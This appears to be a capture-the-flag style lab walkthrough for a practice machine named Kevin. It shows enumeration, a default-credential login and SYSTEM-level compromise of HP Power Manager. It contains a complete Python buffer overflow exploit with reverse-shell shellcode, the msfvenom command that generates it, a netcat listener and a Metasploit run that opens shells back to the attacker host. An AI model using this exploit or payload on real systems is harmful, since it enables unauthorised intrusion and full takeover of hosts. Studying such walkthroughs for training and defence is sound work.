____

# Exploitation Guide for Kevin

## Summary

In this walkthrough, we'll leverage default credentials and a public exploit against HP Power Manager. We'll also successfully exploit it with a public Metasploit module.

## Enumeration

### Nmap

We'll begin with a simple `nmap` scan:

```
root@kali:~# nmap -p- 192.168.120.91
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-26 12:40 EDT
Nmap scan report for 192.168.120.91
Host is up (0.034s latency).
Not shown: 65523 closed ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
3573/tcp  open  tag-ups-1
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49159/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 48.24 seconds
root@kali:~# nmap -A -sV -p 80,135,139,445,3389,3573 192.168.120.91
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-26 12:45 EDT
Nmap scan report for 192.168.120.91
Host is up (0.032s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         GoAhead WebServer
|_http-server-header: GoAhead-Webs
| http-title: HP Power Manager
|_Requested resource was http://192.168.120.91/index.asp
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  tcpwrapped
|_ssl-date: 2020-03-27T00:46:50+00:00; +8h00m00s from scanner time.
3573/tcp open  tag-ups-1?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2008|7|8.1|Vista|2012|10 (94%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (94%), Microsoft Windows Server 2008 R2 (94%), Microsoft Windows Server 2008 R2 or Windows 8.1 (94%), Microsoft Windows 7 (94%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (94%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (94%), Microsoft Windows Vista SP2 (94%), Microsoft Windows Server 2008 (94%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (94%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 9h44m59s, deviation: 3h30m00s, median: 7h59m59s
|_nbstat: NetBIOS name: KEVIN, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:8a:7d:41 (VMware)
| smb-os-discovery: 
|   OS: Windows 7 Ultimate N 7600 (Windows 7 Ultimate N 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::-
|   Computer name: kevin
|   NetBIOS computer name: KEVIN\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-03-26T17:46:33-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-03-27T00:46:34
|_  start_date: 2020-03-27T00:39:28

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   33.45 ms 192.168.118.1
2   28.82 ms 192.168.120.91

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 127.09 seconds
```

### Web Enumeration

Navigating to the default web page on port 80, we are redirected to `/index.asp` and discover that it is an instance of HP Power Manager application:

![](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_08_image_1_KNxnfFuQ.PNG)

The publicly-listed credentials for this software are `admin / admin`.

![](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_08_image_2_LNvkxvKM.PNG)

We can log in with those credentials and navigate to the **Help** page in the main menu to discover that this is **version 4.2 (Build 7)**:

![](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_08_image_3_ovgDCHII.PNG)

## Exploitation

### Shell #1: Universal Buffer Overflow

An exploit for this version is listed at [https://www.exploit-db.com/exploits/10099](https://www.exploit-db.com/exploits/10099)

```
root@kali:~# searchsploit -t "HP Power Manager"
------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                           |  Path
                                                                         | (/usr/share/exploitdb/)
------------------------------------------------------------------------- ----------------------------------------
HP Power Manager - 'formExportDataLogs' Remote Buffer Overflow (Metasplo | exploits/cgi/remote/18015.rb
Hewlett-Packard (HP) Power Manager Administration - Remote Buffer Overfl | exploits/windows/remote/16785.rb
Hewlett-Packard (HP) Power Manager Administration Power Manager Administ | exploits/windows/remote/10099.py
------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
root@kali:~#
```

We'll need to change the shellcode to a reverse shell, keeping in mind the `n00bn00b` egg and the potentially bad characters. Let's generate the shellcode:

```
root@kali:~# msfvenom -p windows/shell_reverse_tcp -f exe --platform windows -a x86 -e x86/alpha_mixed -f c -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" LHOST=192.168.118.3 LPORT=443
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_mixed
x86/alpha_mixed succeeded with size 710 (iteration=0)
x86/alpha_mixed chosen with final size 710
Payload size: 710 bytes
Final size of c file: 3008 bytes
unsigned char buf[] = 
"\x89\xe2\xd9\xc6\xd9\x72\xf4\x5f\x57\x59\x49\x49\x49\x49\x49"

*snip*
```

Here's our completed exploit code:

```
#!/usr/bin/python
# HP Power Manager Administration Universal Buffer Overflow Exploit
# CVE 2009-2685
# Tested on Win2k3 Ent SP2 English, Win XP Sp2 English
# Matteo Memelli ryujin __A-T__ offensive-security.com
# www.offensive-security.com
# Spaghetti & Pwnsauce - 07/11/2009
#
# ryujin@bt:~$ ./hppowermanager.py 172.16.30.203
# HP Power Manager Administration Universal Buffer Overflow Exploit
# ryujin __A-T__ offensive-security.com
# [+] Sending evil buffer...
# HTTP/1.0 200 OK
# [+] Done!
# [*] Check your shell at 172.16.30.203:4444 , can take up to 1 min to spawn your shell
# ryujin@bt:~$ nc -v 172.16.30.203 4444
# 172.16.30.203: inverse host lookup failed: Unknown server error : Connection timed out
# (UNKNOWN) [172.16.30.203] 4444 (?) open
# Microsoft Windows [Version 5.2.3790]
# (C) Copyright 1985-2003 Microsoft Corp.

# C:\WINDOWS\system32>

import sys
from socket import *

print "HP Power Manager Administration Universal Buffer Overflow Exploit"
print "ryujin __A-T__ offensive-security.com"

try:
   HOST  = sys.argv[1]
except IndexError:
   print "Usage: %s HOST" % sys.argv[0]
   sys.exit()

PORT  = 80
RET   = "\xCF\xBC\x08\x76" # 7608BCCF JMP ESP MSVCP60.dll

# [*] Using Msf::Encoder::PexAlphaNum with final size of 709 bytes:
# [*] msfvenom -p windows/shell_reverse_tcp -f exe --platform windows -a x86 -e x86/alpha_mixed -f c -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" LHOST=192.168.118.3 LPORT=443
# badchar = "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a"
SHELL = (
"n00bn00b"
"\x89\xe6\xdb\xdd\xd9\x76\xf4\x5e\x56\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x59\x6c\x58\x68\x4f\x72\x55\x50\x77\x70\x75\x50\x31\x70\x4f"
"\x79\x59\x75\x46\x51\x6f\x30\x33\x54\x4c\x4b\x50\x50\x46\x50"
"\x6e\x6b\x56\x32\x64\x4c\x4e\x6b\x43\x62\x66\x74\x4c\x4b\x44"
"\x32\x74\x68\x56\x6f\x48\x37\x43\x7a\x77\x56\x65\x61\x6b\x4f"
"\x6e\x4c\x57\x4c\x73\x51\x53\x4c\x36\x62\x36\x4c\x65\x70\x5a"
"\x61\x7a\x6f\x34\x4d\x33\x31\x6a\x67\x39\x72\x38\x72\x30\x52"
"\x76\x37\x6c\x4b\x71\x42\x62\x30\x6e\x6b\x51\x5a\x35\x6c\x4e"
"\x6b\x42\x6c\x62\x31\x43\x48\x7a\x43\x47\x38\x46\x61\x5a\x71"
"\x36\x31\x4c\x4b\x30\x59\x65\x70\x37\x71\x58\x53\x6e\x6b\x72"
"\x69\x62\x38\x58\x63\x36\x5a\x52\x69\x4e\x6b\x57\x44\x4e\x6b"
"\x66\x61\x79\x46\x74\x71\x69\x6f\x4e\x4c\x4a\x61\x48\x4f\x74"
"\x4d\x46\x61\x68\x47\x30\x38\x4b\x50\x44\x35\x58\x76\x43\x33"
"\x71\x6d\x49\x68\x75\x6b\x31\x6d\x34\x64\x51\x65\x4a\x44\x30"
"\x58\x6c\x4b\x31\x48\x34\x64\x63\x31\x38\x53\x42\x46\x6c\x4b"
"\x44\x4c\x62\x6b\x6c\x4b\x52\x78\x67\x6c\x77\x71\x6b\x63\x6e"
"\x6b\x53\x34\x4e\x6b\x43\x31\x78\x50\x6e\x69\x63\x74\x31\x34"
"\x57\x54\x61\x4b\x31\x4b\x35\x31\x71\x49\x53\x6a\x43\x61\x6b"
"\x4f\x4b\x50\x71\x4f\x53\x6f\x62\x7a\x6e\x6b\x67\x62\x58\x6b"
"\x6e\x6d\x73\x6d\x63\x58\x65\x63\x55\x62\x75\x50\x47\x70\x63"
"\x58\x31\x67\x74\x33\x70\x32\x51\x4f\x72\x74\x52\x48\x30\x4c"
"\x33\x47\x55\x76\x56\x67\x69\x6f\x68\x55\x4f\x48\x6c\x50\x37"
"\x71\x57\x70\x73\x30\x64\x69\x68\x44\x51\x44\x36\x30\x61\x78"
"\x65\x79\x6b\x30\x42\x4b\x55\x50\x69\x6f\x59\x45\x52\x70\x52"
"\x70\x32\x70\x50\x50\x73\x70\x72\x70\x67\x30\x46\x30\x31\x78"
"\x59\x7a\x76\x6f\x4b\x6f\x59\x70\x39\x6f\x49\x45\x7a\x37\x31"
"\x7a\x55\x55\x75\x38\x4b\x70\x4d\x78\x73\x46\x63\x33\x45\x38"
"\x44\x42\x35\x50\x75\x51\x6f\x4b\x6b\x39\x4a\x46\x53\x5a\x54"
"\x50\x30\x56\x76\x37\x31\x78\x6e\x79\x6c\x65\x54\x34\x53\x51"
"\x49\x6f\x58\x55\x4c\x45\x59\x50\x54\x34\x64\x4c\x6b\x4f\x70"
"\x4e\x36\x68\x34\x35\x38\x6c\x73\x58\x4c\x30\x6f\x45\x4c\x62"
"\x76\x36\x4b\x4f\x38\x55\x73\x58\x31\x73\x50\x6d\x30\x64\x63"
"\x30\x6f\x79\x39\x73\x53\x67\x76\x37\x76\x37\x35\x61\x6c\x36"
"\x43\x5a\x74\x52\x51\x49\x52\x76\x78\x62\x79\x6d\x71\x76\x39"
"\x57\x70\x44\x71\x34\x75\x6c\x67\x71\x67\x71\x4c\x4d\x31\x54"
"\x34\x64\x46\x70\x6f\x36\x57\x70\x37\x34\x61\x44\x32\x70\x43"
"\x66\x51\x46\x33\x66\x42\x66\x51\x46\x62\x6e\x31\x46\x76\x36"
"\x50\x53\x76\x36\x42\x48\x54\x39\x7a\x6c\x65\x6f\x6c\x46\x49"
"\x6f\x78\x55\x4d\x59\x6b\x50\x50\x4e\x30\x56\x61\x56\x79\x6f"
"\x46\x50\x65\x38\x73\x38\x4b\x37\x37\x6d\x63\x50\x39\x6f\x69"
"\x45\x6d\x6b\x38\x70\x6e\x55\x4c\x62\x33\x66\x72\x48\x69\x36"
"\x4c\x55\x4f\x4d\x4d\x4d\x69\x6f\x68\x55\x65\x6c\x55\x56\x73"
"\x4c\x76\x6a\x4d\x50\x49\x6b\x49\x70\x33\x45\x53\x35\x4f\x4b"
"\x67\x37\x75\x43\x64\x32\x42\x4f\x71\x7a\x37\x70\x50\x53\x59"
"\x6f\x4b\x65\x41\x41")

EH ='\x33\xD2\x90\x90\x90\x42\x52\x6a'
EH +='\x02\x58\xcd\x2e\x3c\x05\x5a\x74'
EH +='\xf4\xb8\x6e\x30\x30\x62\x8b\xfa'
EH +='\xaf\x75\xea\xaf\x75\xe7\xff\xe7'

evil =  "POST http://%s/goform/formLogin HTTP/1.1\r\n"
evil += "Host: %s\r\n"
evil += "User-Agent: %s\r\n"
evil += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
evil += "Accept-Language: en-us,en;q=0.5\r\n"
evil += "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
evil += "Keep-Alive: 300\r\n"
evil += "Proxy-Connection: keep-alive\r\n"
evil += "Referer: http://%s/index.asp\r\n"
evil += "Content-Type: application/x-www-form-urlencoded\r\n"
evil += "Content-Length: 678\r\n\r\n"
evil += "HtmlOnly=true&Password=admin&loginButton=Submit+Login&Login=admin"
evil += "\x41"*256 + RET + "\x90"*32 + EH + "\x42"*287 + "\x0d\x0a"
evil = evil % (HOST,HOST,SHELL,HOST)

s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))
print '[+] Sending evil buffer...'
s.send(evil)
print s.recv(1024)
print "[+] Done!"
print "[*] Check your shell at %s:4444 , can take up to 1 min to spawn your shell" % HOST
s.close()
```

Let's set up a netcat listener on port 443 and launch the Python exploit against the target.

```
root@kali:~# python exploit.py 192.168.120.91
HP Power Manager Administration Universal Buffer Overflow Exploit
ryujin __A-T__ offensive-security.com
[+] Sending evil buffer...
HTTP/1.0 200 OK

[+] Done!
[*] Check your shell at 192.168.120.91:4444 , can take up to 1 min to spawn your shell
root@kali:~#
```

After a few seconds we should receive our reverse shell:

```
root@kali:~# nc -lvp 443
listening on [any] 443 ...
192.168.120.91: inverse host lookup failed: Unknown host
connect to [192.168.118.3] from (UNKNOWN) [192.168.120.91] 49170
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

### Shell #2: Metasploit Module hp_power_manager_filename

We could also leverage a public Metasploit module against this vulnerability.

```
msf5 > use exploit/windows/http/hp_power_manager_filename
msf5 exploit(windows/http/hp_power_manager_filename) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(windows/http/hp_power_manager_filename) > set RHOST 192.168.120.91
RHOST => 192.168.120.91
msf5 exploit(windows/http/hp_power_manager_filename) > set LHOST 192.168.118.3
LHOST => 192.168.118.3
msf5 exploit(windows/http/hp_power_manager_filename) > set LPORT 443
LPORT => 443
msf5 exploit(windows/http/hp_power_manager_filename) > options

Module options (exploit/windows/http/hp_power_manager_filename):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   192.168.120.91   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.118.3    yes       The listen address (an interface may be specified)
   LPORT     443              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows XP SP3 / Win Server 2003 SP0


msf5 exploit(windows/http/hp_power_manager_filename) > run

[*] Started reverse TCP handler on 192.168.118.3:443 
[*] Generating payload...
[*] Trying target Windows XP SP3 / Win Server 2003 SP0...
[*] Sending stage (180291 bytes) to 192.168.120.91
[*] Meterpreter session 1 opened (192.168.118.3:443 -> 192.168.120.91:49167) at 2020-03-26 13:39:25 -0400
[*] Payload sent! Go grab a coffee, the CPU is gonna work hard for you! :)

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 3620 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

In some cases this module produces the following error:

```
msf5 exploit(windows/http/hp_power_manager_filename) > run

[*] Started reverse TCP handler on 192.168.118.3:443 
[*] Generating payload...
[*] Trying target Windows XP SP3 / Win Server 2003 SP0...
[*] Payload sent! Go grab a coffee, the CPU is gonna work hard for you! :)
[*] Exploit completed, but no session was created.
msf5 exploit(windows/http/hp_power_manager_filename) >
```

However, this is easily resolved by re-running the module.
